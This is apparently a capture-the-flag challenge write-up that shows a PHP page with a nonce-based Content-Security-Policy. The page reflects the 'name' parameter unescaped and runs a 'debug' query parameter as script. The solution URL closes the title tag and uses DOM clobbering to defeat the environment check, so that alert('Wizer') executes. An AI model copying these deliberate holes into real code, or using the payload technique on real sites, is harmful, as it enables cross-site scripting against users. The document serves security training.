# Challenge 3

## Inject an alert("Wizer")

```html
<?php
$nonce = md5(random_bytes(32));
header("Content-Security-Policy: script-src 'nonce-$nonce'");
?>
<head>
    <meta charset="UTF-8">
    <title>
        <?php echo 'Welcome ' . ($_GET['name'] ?? "") ?>
    </title>
    <script nonce="<?php echo $nonce ?>">
        window.environment = 'production';
    </script>
</head>
<body>
<script nonce="<?php echo $nonce ?>">
    if (window.environment && window.environment !== 'production') {
        let debug = new URL(location)
            .searchParams.get('debug') || '';
        const script = document.createElement('script');
        script.nonce = "<?php echo $nonce ?>";
        script.innerText = debug;
        document.body.appendChild(script);
    }
</script>
</body>
```

## Solution

```text
{URL}/?name=%3C/title%3E%3Cdiv%20id=%27environment%27%3E%3C/div%3E%3Cscript%3E&debug=alert(%27Wizer%27)
```
